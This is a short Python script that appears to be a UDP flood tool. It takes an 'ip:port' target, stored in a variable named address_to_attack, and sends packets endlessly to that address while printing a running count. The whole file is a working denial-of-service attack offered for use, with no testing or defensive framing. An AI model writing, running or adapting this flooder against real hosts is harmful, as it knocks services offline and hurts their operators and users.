import time
import socket
import random
import sys

address_to_attack = ''
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


def generate_msg():
    return bytes(random.getrandbits(10))


def start_flood():
    sent_packets = 0
    ip, port = address_to_attack.split(':')
    while True:
        sock.sendto(generate_msg(), (ip, int(port)))
        sent_packets += 1
        print(f'{sent_packets} packages sent')


def run(address):
    global address_to_attack
    address_to_attack = address
    start_flood()
